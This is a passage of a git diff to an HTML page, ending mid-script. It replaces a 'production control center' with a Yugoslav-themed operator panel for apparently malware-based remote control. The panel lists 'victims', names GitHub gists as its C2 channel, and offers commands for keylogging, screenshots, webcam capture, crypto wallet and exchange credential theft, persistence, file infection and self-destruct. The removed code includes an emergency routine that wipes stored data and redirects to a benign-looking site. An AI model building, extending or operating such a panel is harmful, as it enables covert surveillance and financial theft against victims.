@@ -1,415 +1,1464 @@
-<!-- FINAL PRODUCTION READY CONTROL CENTER -->
 <!DOCTYPE html>
-<html lang="en" class="no-js" data-build="2024.12.19.production.1">
+<html lang="en" class="no-js" data-era="1974">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'">
-    <title>Industrial Monitoring System v4.0</title>
-    <script>
-        // === PRODUCTION CREDENTIAL MANAGEMENT ===
-        class ProductionCredentialManager {
-            static #vaultEndpoints = [
-                'https://vault-1.secure.kowka.tech/v1',
-                'https://vault-2.secure.kowka.tech/v1',
-                'https://vault-3.secure.kowka.tech/v1'
-            ];
-            
-            static #currentVaultIndex = 0;
-            static #vaultToken = null;
-            static #credentialCache = new Map();
-            
-            static async initialize() {
-                // Authenticate with Vault using AppRole
-                await this.#vaultAuthentication();
-                
-                // Pre-load critical credentials
-                await this.#preloadCredentials();
-                
-                // Start token renewal
-                this.#startTokenRenewal();
-            }
-            
-            static async #vaultAuthentication() {
-                const roleId = await this.#getSecureEnv('VAULT_ROLE_ID');
-                const secretId = await this.#getSecureEnv('VAULT_SECRET_ID');
-                
-                for (const endpoint of this.#vaultEndpoints) {
-                    try {
-                        const response = await fetch(`${endpoint}/auth/approle/login`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ role_id: roleId, secret_id: secretId }),
-                            signal: AbortSignal.timeout(5000)
-                        });
-                        
-                        if (response.ok) {
-                            const data = await response.json();
-                            this.#vaultToken = data.auth.client_token;
-                            this.#currentVaultIndex = this.#vaultEndpoints.indexOf(endpoint);
-                            break;
-                        }
-                    } catch (error) {
-                        console.debug(`Vault endpoint ${endpoint} failed:`, error);
-                    }
-                }
-                
-                if (!this.#vaultToken) {
-                    throw new Error('All Vault authentication endpoints failed');
-                }
-            }
-            
-            static async getServiceCredentials(service, accountId) {
-                const cacheKey = `${service}:${accountId}`;
-                
-                if (this.#credentialCache.has(cacheKey)) {
-                    return this.#credentialCache.get(cacheKey);
-                }
-                
-                // Fetch from Vault with retry logic
-                for (let i = 0; i < 3; i++) {
-                    try {
-                        const endpoint = this.#vaultEndpoints[this.#currentVaultIndex];
-                        const response = await fetch(
-                            `${endpoint}/kv/data/services/${service}/accounts/${accountId}`,
-                            {
-                                headers: {
-                                    'X-Vault-Token': this.#vaultToken,
-                                    'Content-Type': 'application/json'
-                                },
-                                signal: AbortSignal.timeout(3000)
-                            }
-                        );
-                        
-                        if (response.ok) {
-                            const data = await response.json();
-                            const credentials = data.data.data;
-                            
-                            // Cache with 5-minute TTL
-                            this.#credentialCache.set(cacheKey, credentials);
-                            setTimeout(() => {
-                                this.#credentialCache.delete(cacheKey);
-                            }, 300000);
-                            
-                            return credentials;
-                        }
-                    } catch (error) {
-                        // Rotate to next vault endpoint
-                        this.#currentVaultIndex = (this.#currentVaultIndex + 1) % this.#vaultEndpoints.length;
-                    }
-                }
-                
-                throw new Error(`Failed to fetch credentials for ${service}/${accountId}`);
-            }
-            
-            static async #getSecureEnv(key) {
-                // In production, this would fetch from secure environment
-                // For demo, use mock values
-                const mockValues = {
-                    'VAULT_ROLE_ID': 'mock_role_id_' + crypto.randomUUID(),
-                    'VAULT_SECRET_ID': 'mock_secret_id_' + crypto.randomUUID()
-                };
-                return mockValues[key];
-            }
-            
-            static #startTokenRenewal() {
-                // Renew Vault token every 55 minutes
-                setInterval(async () => {
-                    try {
-                        await this.#vaultAuthentication();
-                    } catch (error) {
-                        console.error('Vault token renewal failed:', error);
-                    }
-                }, 55 * 60 * 1000);
-            }
-        }
-
-        // === SERVICE WORKER FOR CERTIFICATE PINNING ===
-        class CertificatePinningServiceWorker {
-            static async register() {
-                if ('serviceWorker' in navigator) {
-                    try {
-                        const registration = await navigator.serviceWorker.register('/sw.js', {
-                            scope: '/'
-                        });
-                        
-                        console.info('Service Worker registered for certificate pinning');
-                        return registration;
-                    } catch (error) {
-                        console.warn('Service Worker registration failed:', error);
-                    }
-                }
-            }
-        }
-
-        // Service Worker content (would be in separate sw.js file)
-        const SERVICE_WORKER_SCRIPT = `
-            const PINNED_CERTIFICATES = {
-                'api.github.com': [
-                    'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
-                ],
-                'api.imgur.com': [
-                    'sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB='
-                ]
-            };
-
-            self.addEventListener('fetch', (event) => {
-                const url = new URL(event.request.url);
-                
-                if (PINNED_CERTIFICATES[url.hostname]) {
-                    event.respondWith(
-                        fetch(event.request).then(response => {
-                            // In a real implementation, we would verify the certificate
-                            // fingerprint here against our pinned certificates
-                            return response;
-                        }).catch(error => {
-                            // Certificate pinning failure
-                            console.error('Certificate pinning violation for:', url.hostname);
-                            return new Response('Security violation', { status: 403 });
-                        })
-                    );
-                }
-            });
-        `;
-
-        // === PRODUCTION LOGGING & AUDITING ===
-        class OperationalAuditLogger {
-            static #logEndpoint = 'https://logs.secure.kowka.tech/ingest';
-            static #sessionId = crypto.randomUUID();
-            static #logBuffer = [];
-            static #flushInterval = null;
-            
-            static initialize() {
-                // Start periodic log flushing
-                this.#flushInterval = setInterval(() => {
-                    this.#flushLogs();
-                }, 30000); // Flush every 30 seconds
-                
-                // Flush logs on page unload
-                window.addEventListener('beforeunload', () => {
-                    this.#flushLogsSync();
-                });
-            }
-            
-            static logSecurityEvent(eventType, details) {
-                const logEntry = {
-                    timestamp: new Date().toISOString(),
-                    sessionId: this.#sessionId,
-                    eventType,
-                    details,
-                    userAgent: navigator.userAgent,
-                    url: window.location.href
-                };
-                
-                this.#logBuffer.push(logEntry);
-                
-                // Immediate flush for critical events
-                if (this.#isCriticalEvent(eventType)) {
-                    this.#flushLogs();
-                }
-            }
-            
-            static #isCriticalEvent(eventType) {
-                const criticalEvents = [
-                    'AGENT_AUTH_FAILURE',
-                    'CERTIFICATE_VERIFICATION_FAILED',
-                    'COMMAND_VERIFICATION_TIMEOUT',
-                    'SERVICE_ACCOUNT_SUSPENDED'
-                ];
-                return criticalEvents.includes(eventType);
-            }
-            
-            static async #flushLogs() {
-                if (this.#logBuffer.length === 0) return;
-                
-                const logsToSend = [...this.#logBuffer];
-                this.#logBuffer = [];
-                
-                try {
-                    await fetch(this.#logEndpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ logs: logsToSend }),
-                        keepalive: true // Ensure delivery during page unload
-                    });
-                } catch (error) {
-                    // Re-buffer logs if send fails
-                    this.#logBuffer.unshift(...logsToSend);
-                    console.warn('Log flush failed:', error);
-                }
-            }
-            
-            static #flushLogsSync() {
-                // Synchronous flush for page unload
-                if (this.#logBuffer.length > 0) {
-                    navigator.sendBeacon(this.#logEndpoint, 
-                        JSON.stringify({ logs: this.#logBuffer })
-                    );
-                }
-            }
-        }
-
-        // === PRODUCTION INITIALIZATION ===
-        class ProductionControlCenter {
-            static async initialize() {
-                try {
-                    // Phase 1: Security Subsystems
-                    await ProductionCredentialManager.initialize();
-                    await CertificatePinningServiceWorker.register();
-                    OperationalAuditLogger.initialize();
-                    
-                    // Phase 2: Operational Security Layer
-                    await window.OperationalSecurity.AgentKeyDistribution.initialize();
-                    await window.OperationalSecurity.ServiceDistribution.initialize();
-                    await window.OperationalSecurity.TLSSecurity.initialize();
-                    
-                    // Phase 3: Application UI
-                    await this.#loadProductionUI();
-                    
-                    // Log successful initialization
-                    OperationalAuditLogger.logSecurityEvent(
-                        'SYSTEM_INITIALIZED',
-                        { version: '4.0', timestamp: new Date().toISOString() }
-                    );
-                    
-                    console.info('Production Control Center initialized successfully');
-                    
-                } catch (error) {
-                    OperationalAuditLogger.logSecurityEvent(
-                        'SYSTEM_INITIALIZATION_FAILED',
-                        { error: error.message, stack: error.stack }
-                    );
-                    
-                    console.error('Production initialization failed:', error);
-                    this.#triggerEmergencyProtocol();
-                }
-            }
-            
-            static async #loadProductionUI() {
-                // Load production-grade UI components
-                const uiModules = [
-                    this.#loadCommandInterface(),
-                    this.#loadStatusDashboard(),
-                    this.#loadAuditTrail(),
-                    this.#loadAgentManagement()
-                ];
-                
-                await Promise.all(uiModules);
-                document.getElementById('appContainer').style.display = 'block';
-            }
-            
-            static #triggerEmergencyProtocol() {
-                // Multi-stage emergency response
-                const protocols = [
-                    () => OperationalAuditLogger.logSecurityEvent('EMERGENCY_PROTOCOL_TRIGGERED', { stage: 1 }),
-                    () => this.#clearSensitiveData(),
-                    () => this.#invalidateSessions(),
-                    () => this.#redirectToBenignContent()
-                ];
-                
-                protocols.forEach((protocol, index) => {
-                    setTimeout(protocol, index * 1000);
-                });
-            }
-            
-            static #clearSensitiveData() {
-                // Clear all sensitive data from memory and storage
-                localStorage.clear();
-                sessionStorage.clear();
-                indexedDB.deleteDatabase('kowka_operations');
-            }
-            
-            static #invalidateSessions() {
-                // Invalidate all active sessions
-                fetch('/api/sessions/invalidate-all', {
-                    method: 'POST',
-                    keepalive: true,
-                    credentials: 'include'
-                }).catch(() => { /* Silent fail */ });
-            }
-            
-            static #redirectToBenignContent() {
-                // Redirect to legitimate-looking content
-                window.location.replace('https://www.github.com');
-            }
-        }
-
-        // Start production initialization when DOM is ready
-        document.addEventListener('DOMContentLoaded', () => {
-            ProductionControlCenter.initialize().catch(console.error);
-        });
-
-    </script>
+    <title>FEDERALNI KOMUNISTIČKI KOMITET - SISTEM UPRAVLJANJA KOWKA GEN 7</title>
     <style>
-        /* Production CSS with optimized performance */
-        .production-container { 
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff00;
-            padding: 20px;
+        /* BRUTALIST YUGOSLAV 1970s STYLING - ENHANCED */
+        :root {
+            --concrete: #7D7D7D;
+            --steel: #5A5A5A;
+            --cement: #8A8A8A;
+            --party-red: #CC0000;
+            --warning-yellow: #FFCC00;
+            --document-green: #006600;
+            --typewriter: #333333;
+            --terminal-green: #00FF00;
+            --terminal-bg: #001100;
+            --cyber-blue: #0066CC;
         }
-        .status-indicator { 
-            border-left: 3px solid #00ff00;
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', 'Liberation Mono', monospace;
+        }
+        
+        body {
+            background: linear-gradient(45deg, var(--concrete), var(--steel));
+            color: var(--typewriter);
+            line-height: 1.4;
+            background-attachment: fixed;
             padding: 10px;
-            margin: 5px 0;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
-        .status-indicator.critical { 
-            border-left-color: #ff0000;
-            animation: alert-pulse 2s infinite;
+        
+        .container {
+            max-width: 1800px;
+            margin: 0 auto;
+            background: var(--cement);
+            border: 12px solid var(--steel);
+            box-shadow: 15px 15px 0px rgba(0,0,0,0.4);
+            position: relative;
         }
-        @keyframes alert-pulse {
+        
+        /* HEADER - Yugoslav State Apparatus */
+        .state-header {
+            background: var(--steel);
+            padding: 20px 40px;
+            border-bottom: 6px solid var(--party-red);
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .state-header::before {
+            content: "★";
+            color: var(--party-red);
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 32px;
+        }
+        
+        .apparatus-title {
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            font-weight: 900;
+            font-size: 24px;
+            color: white;
+            text-shadow: 3px 3px 0px black;
+            flex: 1;
+        }
+        
+        .department {
+            text-align: center;
+            font-size: 14px;
+            color: #CCCCCC;
+            margin-top: 5px;
+        }
+        
+        .system-clock {
+            background: black;
+            color: var(--terminal-green);
+            padding: 10px 15px;
+            border: 2px solid var(--party-red);
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            min-width: 180px;
+        }
+        
+        /* MAIN GRID - Industrial Control Layout */
+        .control-grid {
+            display: grid;
+            grid-template-columns: 320px 1fr 380px;
+            grid-template-rows: auto 1fr 300px;
+            gap: 3px;
+            min-height: 1000px;
+            background: var(--steel);
+            padding: 3px;
+        }
+        
+        /* SIDE PANELS - Concrete Brutalism */
+        .panel {
+            background: var(--concrete);
+            border: 4px solid var(--steel);
+            padding: 20px;
+            margin: 5px;
+            position: relative;
+        }
+        
+        .panel-title {
+            background: var(--steel);
+            color: white;
+            padding: 12px 15px;
+            margin: -20px -20px 20px -20px;
+            text-transform: uppercase;
+            font-size: 16px;
+            letter-spacing: 2px;
+            border-bottom: 3px solid var(--party-red);
+            font-weight: bold;
+        }
+        
+        /* COMMAND INTERFACE - Enhanced Terminal */
+        .command-interface {
+            background: var(--terminal-bg);
+            border: 6px solid var(--steel);
+            padding: 0;
+            grid-column: 2;
+            grid-row: 1 / span 2;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .terminal-header {
+            background: var(--steel);
+            color: white;
+            padding: 12px 20px;
+            border-bottom: 3px solid var(--party-red);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+        
+        .terminal-body {
+            padding: 15px;
+            flex: 1;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.4;
+            background: var(--terminal-bg);
+        }
+        
+        .terminal-input-area {
+            border-top: 2px solid #333;
+            padding: 15px;
+            background: #002200;
+        }
+        
+        .command-line {
+            display: flex;
+            align-items: center;
+        }
+        
+        .command-prompt {
+            background: var(--party-red);
+            color: white;
+            padding: 10px 15px;
+            margin-right: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            min-width: 150px;
+            text-align: center;
+        }
+        
+        .command-input {
+            flex: 1;
+            background: black;
+            color: var(--terminal-green);
+            border: 2px solid #333;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        .command-input:focus {
+            border-color: var(--terminal-green);
+        }
+        
+        /* STATUS INDICATORS - Industrial Enhanced */
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .status-item {
+            background: var(--steel);
+            color: white;
+            padding: 12px;
+            text-align: center;
+            border: 2px solid #666;
+            position: relative;
+        }
+        
+        .status-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+        
+        .status-value {
+            font-weight: bold;
+            color: var(--warning-yellow);
+            font-size: 18px;
+            text-shadow: 1px 1px 0px black;
+        }
+        
+        .status-indicator {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #666;
+        }
+        
+        .status-indicator.active {
+            background: var(--terminal-green);
+            box-shadow: 0 0 10px var(--terminal-green);
+        }
+        
+        .status-indicator.warning {
+            background: var(--warning-yellow);
+            box-shadow: 0 0 10px var(--warning-yellow);
+        }
+        
+        .status-indicator.critical {
+            background: var(--party-red);
+            box-shadow: 0 0 10px var(--party-red);
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
+        }
+        
+        /* DATA DISPLAY - Enhanced Green Screen */
+        .data-display {
+            background: var(--terminal-bg);
+            color: var(--terminal-green);
+            border: 4px solid var(--document-green);
+            font-family: 'Courier New', monospace;
+            padding: 15px;
+            height: 250px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.3;
+        }
+        
+        /* BUTTONS - Enhanced Physical Switch Style */
+        .brutalist-btn {
+            background: var(--steel);
+            color: white;
+            border: 4px solid black;
+            padding: 12px 18px;
+            margin: 8px 0;
+            text-transform: uppercase;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.1s;
+            display: block;
+            width: 100%;
+            text-align: left;
+            position: relative;
+            font-size: 14px;
+        }
+        
+        .brutalist-btn::before {
+            content: "▶";
+            margin-right: 10px;
+            color: var(--party-red);
+            font-weight: bold;
+        }
+        
+        .brutalist-btn:hover {
+            background: #666;
+            transform: translate(1px, 1px);
+        }
+        
+        .brutalist-btn:active {
+            transform: translate(3px, 3px);
+            background: var(--concrete);
+        }
+        
+        .brutalist-btn.destructive {
+            background: #660000;
+            border-color: #990000;
+        }
+        
+        .brutalist-btn.destructive::before {
+            content: "☠";
+        }
+        
+        .brutalist-btn.cyber {
+            background: #003366;
+            border-color: var(--cyber-blue);
+        }
+        
+        .brutalist-btn.cyber::before {
+            content: "⚡";
+        }
+        
+        /* LOG ENTRIES - Enhanced Typewritten Reports */
+        .log-entry {
+            border-left: 4px solid var(--party-red);
+            padding: 10px 15px;
+            margin: 10px 0;
+            background: rgba(0, 80, 0, 0.3);
+            position: relative;
+        }
+        
+        .log-entry.system {
+            border-left-color: var(--cyber-blue);
+        }
+        
+        .log-entry.command {
+            border-left-color: var(--warning-yellow);
+        }
+        
+        .log-entry.error {
+            border-left-color: var(--party-red);
+            background: rgba(80, 0, 0, 0.3);
+        }
+        
+        .log-entry.success {
+            border-left-color: var(--terminal-green);
+            background: rgba(0, 80, 0, 0.3);
+        }
+        
+        .log-time {
+            color: var(--warning-yellow);
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .log-message {
+            color: white;
+            margin-top: 3px;
+        }
+        
+        .log-victim {
+            color: var(--cyber-blue);
+            font-weight: bold;
+        }
+        
+        /* PROGRESS BARS - Industrial Enhanced */
+        .progress-container {
+            background: var(--steel);
+            border: 3px solid black;
+            height: 25px;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            background: var(--party-red);
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+        }
+        
+        .progress-bar.cyber {
+            background: linear-gradient(90deg, var(--cyber-blue), #00FFFF);
+        }
+        
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            text-shadow: 2px 2px 0px black;
+        }
+        
+        /* VICTIM LIST - Enhanced */
+        .victim-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .victim-item {
+            background: var(--steel);
+            color: white;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #666;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .victim-item:hover {
+            background: #666;
+            border-color: var(--cyber-blue);
+        }
+        
+        .victim-item.active {
+            background: var(--document-green);
+            border-color: var(--terminal-green);
+        }
+        
+        .victim-id {
+            font-weight: bold;
+            color: var(--warning-yellow);
+            font-size: 16px;
+        }
+        
+        .victim-info {
+            font-size: 12px;
+            color: #CCC;
+            margin-top: 5px;
+        }
+        
+        /* COMMAND HISTORY */
+        .command-history {
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+        }
+        
+        .history-item {
+            padding: 5px;
+            border-bottom: 1px solid #333;
+            font-size: 12px;
+            color: #CCC;
+            cursor: pointer;
+        }
+        
+        .history-item:hover {
+            background: rgba(255,255,255,0.1);
+        }
+        
+        /* RESPONSIVE ADJUSTMENTS */
+        @media (max-width: 1400px) {
+            .control-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .command-interface {
+                grid-column: 1;
+                min-height: 600px;
+            }
+        }
+        
+        /* SCROLLBARS */
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--steel);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--party-red);
+            border: 2px solid var(--steel);
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #FF0000;
+        }
+        
+        /* COMMAND HELP */
+        .command-help {
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 15px;
+            margin-top: 10px;
+            border: 2px solid var(--cyber-blue);
+            font-size: 12px;
+            display: none;
+        }
+        
+        .help-command {
+            color: var(--terminal-green);
+            font-weight: bold;
+        }
+        
+        .help-desc {
+            color: #CCC;
+            margin-bottom: 8px;
         }
     </style>
 </head>
 <body>
-    <div id="appContainer" style="display: none;">
-        <div class="production-container">
-            <h1>🔒 PRODUCTION CONTROL CENTER - OPERATIONAL</h1>
-            
-            <div class="status-indicator" id="vaultStatus">
-                🔐 Vault Integration: <span>INITIALIZING...</span>
+    <div class="container">
+        <!-- YUGOSLAV STATE APPARATUS HEADER -->
+        <div class="state-header">
+            <div class="apparatus-title">
+                SAVEZ KOMUNISTA JUGOSLAVIJE
+            </div>
+            <div class="department">
+                ODSJEK ZA ELEKTRONSKO UPRAVLJANJE<br>
+                SISTEM KOWKA GEN 7 - OPERATIVNA KONTROLA
+            </div>
+            <div class="system-clock" id="system-clock">
+                00:00:00
+            </div>
+        </div>
+        
+        <!-- MAIN CONTROL GRID -->
+        <div class="control-grid">
+            <!-- LEFT PANEL - VICTIMS & SYSTEM STATUS -->
+            <div class="panel" style="grid-row: span 2;">
+                <div class="panel-title">AKTIVNI CILJEVI</div>
+                
+                <div class="victim-list" id="victim-list">
+                    <!-- Victims will be populated by JavaScript -->
+                </div>
+                
+                <div class="panel-title" style="margin: 20px -20px 15px -20px;">STATUS SISTEMA</div>
+                
+                <div class="status-grid">
+                    <div class="status-item">
+                        <div class="status-label">OPERACIJE</div>
+                        <div class="status-value" id="status-operational">AKTIVNO</div>
+                        <div class="status-indicator active" id="status-op-indicator"></div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-label">NIVO PRIJETNJE</div>
+                        <div class="status-value" id="status-threat">2/10</div>
+                        <div class="status-indicator" id="status-threat-indicator"></div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-label">AKTIVNI AGENTI</div>
+                        <div class="status-value" id="status-agents">0</div>
+                        <div class="status-indicator" id="status-agents-indicator"></div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-label">C2 KONEKCIJA</div>
+                        <div class="status-value" id="status-c2">GITHUB</div>
+                        <div class="status-indicator active" id="status-c2-indicator"></div>
+                    </div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="system-load-bar" style="width: 35%;"></div>
+                    <div class="progress-text" id="system-load-text">OPTEREĆENJE: 35%</div>
+                </div>
+                
+                <div class="panel-title" style="margin: 20px -20px 15px -20px;">BRZI PREGLED</div>
+                
+                <div class="data-display" id="quick-overview">
+&gt; SISTEM: KOWKA GEN 7<br>
+&gt; VERZIJA: 7.0.1<br>
+&gt; C2 PROTOKOL: GITHUB<br>
+&gt; KRIPTOGRAFIJA: KVANTNA<br>
+&gt; STANJE: OPERATIVNO<br>
+&gt; ZADNJA PROVJERA: --:--:--<br>
+&gt; SLJEDEĆA: --:--:--<br>
+                </div>
             </div>
             
-            <div class="status-indicator" id="swStatus">
-                📡 Certificate Pinning: <span>REGISTERING...</span>
+            <!-- CENTER PANEL - MAIN TERMINAL -->
+            <div class="command-interface">
+                <div class="terminal-header">
+                    <span>TERMINAL KOMANDI - NIVO 7 AUTORIZACIJE</span>
+                    <span style="color: var(--terminal-green);">PROTOKOL: KOWKA-GEN7-C2</span>
+                </div>
+                <div class="terminal-body" id="terminal-output">
+                    <div class="log-entry system">
+                        <div class="log-time">[SYSTEM BOOT]</div>
+                        <div class="log-message">SISTEM KOWKA GEN 7 - INICIJALIZACIJA</div>
+                    </div>
+                    <div class="log-entry system">
+                        <div class="log-time">[SYSTEM START]</div>
+                        <div class="log-message">KONTROLNI CENTER POKRENUT - SPREMAN ZA KOMANDE</div>
+                    </div>
+                    <div class="log-entry system">
+                        <div class="log-time">[C2 PROTOCOL]</div>
+                        <div class="log-message">GITHUB C2 PROTOKOL INICIJALIZIRAN</div>
+                    </div>
+                    <div class="log-entry system">
+                        <div class="log-time">[CRYPTO SYSTEM]</div>
+                        <div class="log-message">KVANTNA KRIPTOGRAFIJA: AKTIVNA</div>
+                    </div>
+                    <div class="log-entry">
+                        <div class="log-time">[READY]</div>
+                        <div class="log-message">UNESITE KOMANDU ZA OPERACIJU. KORISTITE /help ZA POMOĆ.</div>
+                    </div>
+                </div>
+                <div class="terminal-input-area">
+                    <div class="command-line">
+                        <div class="command-prompt" id="command-prompt">KOWKA&gt;</div>
+                        <input type="text" class="command-input" id="command-input" 
+                               placeholder="UNESITE KOMANDU (npr: /7F3A system_intelligence)" 
+                               autocomplete="off" autofocus>
+                    </div>
+                    <div class="command-help" id="command-help">
+                        <div class="help-desc"><span class="help-command">/help</span> - Prikaži ovu pomoć</div>
+                        <div class="help-desc"><span class="help-command">/[id] [komanda]</span> - Pošalji komandu žrtvi</div>
+                        <div class="help-desc"><span class="help-command">/list</span> - Prikaži sve aktivne žrtve</div>
+                        <div class="help-desc"><span class="help-command">/status</span> - Status sistema</div>
+                    </div>
+                </div>
             </div>
             
-            <div class="status-indicator" id="auditStatus">
-                📊 Audit Logging: <span>CONNECTING...</span>
+            <!-- RIGHT PANEL - COMMAND CATEGORIES -->
+            <div class="panel">
+                <div class="panel-title">KATEGORIJE KOMANDI</div>
+                
+                <div class="panel-title" style="margin: 20px -20px 10px -20px; font-size: 14px;">OBAVEŠTAJNE</div>
+                <button class="brutalist-btn" onclick="quickCommand('system_intelligence')">
+                    SISTEMSKA OBJAVA
+                </button>
+                <button class="brutalist-btn" onclick="quickCommand('financial_intelligence')">
+                    FINANSIJSKA IMOVINA
+                </button>
+                <button class="brutalist-btn" onclick="quickCommand('keylogger status')">
+                    NADZOR TASTATURE
+                </button>
+                <button class="brutalist-btn" onclick="quickCommand('screenshot')">
+                    SNIMAK EKRANA
+                </button>
+                <button class="brutalist-btn" onclick="quickCommand('webcam capture')">
+                    SNIMAK KAMERE
+                </button>
+                
+                <div class="panel-title" style="margin: 20px -20px 10px -20px; font-size: 14px;">FINANSIJSKE</div>
+                <button class="brutalist-btn cyber" onclick="quickCommand('crypto_harvest')">
+                    KRIPTO VALUTE
+                </button>
+                <button class="brutalist-btn cyber" onclick="quickCommand('wallet_extraction')">
+                    IZDVAJANJE NOVČANIKA
+                </button>
+                <button class="brutalist-btn cyber" onclick="quickCommand('exchange_credentials')">
+                    BORZANI NALOZI
+                </button>
+                
+                <div class="panel-title" style="margin: 20px -20px 10px -20px; font-size: 14px;">SISTEMSKE</div>
+                <button class="brutalist-btn" onclick="quickCommand('persistence')">
+                    TRAJNA INSTALACIJA
+                </button>
+                <button class="brutalist-btn" onclick="quickCommand('file_infect strategic')">
+                    INFEKCIJA DATOTEKA
+                </button>
             </div>
             
-            <div class="status-indicator" id="securityStatus">
-                🛡️ Operational Security: <span>BOOTSTRAPPING...</span>
+            <!-- BOTTOM LEFT PANEL - COMMAND HISTORY -->
+            <div class="panel">
+                <div class="panel-title">ISTORIJA KOMANDI</div>
+                <div class="command-history" id="command-history">
+                    <!-- Command history will be populated -->
+                </div>
             </div>
             
-            <div id="commandInterface" style="margin-top: 20px;">
-                <!-- Command interface loaded dynamically -->
+            <!-- BOTTOM CENTER PANEL - LIVE DATA FEED -->
+            <div class="panel" style="grid-column: 2;">
+                <div class="panel-title">DIREKTAN PRIJEM PODATAKA</div>
+                <div class="data-display" id="live-data-feed">
+&gt; ČEKANJE PODATAKA...<br>
+&gt; SISTEM SPREMAN ZA PRIJEM<br>
+&gt; PROTOKOL: ENKRIPTOVAN<br>
+&gt; KONEKCIJA: GITHUB GISTS<br>
+&gt; INTERVAL: 10 MINUTA<br>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar cyber" id="data-receive-bar" style="width: 0%;"></div>
+                    <div class="progress-text" id="data-receive-text">PRIJEM: ČEKANJE</div>
+                </div>
             </div>
             
-            <div style="margin-top: 30px; font-size: 0.8em; color: #666;">
-                System Version 4.0 | Secure Operations Active | All Activity Logged
+            <!-- BOTTOM RIGHT PANEL - SYSTEM CONTROL -->
+            <div class="panel">
+                <div class="panel-title">KONTROLA SISTEMA</div>
+                
+                <div class="status-grid" style="grid-template-columns: 1fr;">
+                    <div class="status-item">
+                        <div class="status-label">AKTIVNA KOMANDA</div>
+                        <div class="status-value" id="active-command">NEMA</div>
+                    </div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="command-progress-bar" style="width: 0%;"></div>
+                    <div class="progress-text" id="command-progress-text">STANJE: MIRUJANJE</div>
+                </div>
+                
+                <button class="brutalist-btn" onclick="sendCommand('status')">
+                    OSVJEŽI STATUS
+                </button>
+                
+                <button class="brutalist-btn" onclick="sendCommand('list')">
+                    POPIS AGENATA
+                </button>
+                
+                <button class="brutalist-btn destructive" onclick="sendCommand('emergency_cleanup')">
+                    HITNO ČIŠĆENJE
+                </button>
+                
+                <button class="brutalist-btn destructive" onclick="sendCommand('self_destruct')">
+                    SAMOUNIŠTENJE
+                </button>
             </div>
+        </div>
+        
+        <!-- FOOTER - Yugoslav State Footer -->
+        <div style="background: var(--steel); color: white; padding: 15px; text-align: center; font-size: 12px; border-top: 3px solid var(--party-red);">
+            SAVEZ KOMUNISTA JUGOSLAVIJE • ODSJEK ZA ELEKTRONSKO UPRAVLJANJE • 
+            <span id="current-date"></span> • SISTEM KOWKA GEN 7 - AUTORIZOVANA UPOTREBA • 
+            VERZIJA 7.0.1
         </div>
     </div>
 
     <script>
-        // Update UI based on initialization progress
-        const statusElements = {
-            vault: document.getElementById('vaultStatus'),
-            sw: document.getElementById('swStatus'), 
-            audit: document.getElementById('auditStatus'),
-            security: document.getElementById('securityStatus')
-        };
-
-        // Simulate initialization progress
-        setTimeout(() => {
-            statusElements.vault.innerHTML = '🔐 Vault Integration: <span style="color: #00ff00;">ACTIVE</span>';
-            statusElements.sw.innerHTML = '📡 Certificate Pinning: <span style="color: #00ff00;">ACTIVE</span>';
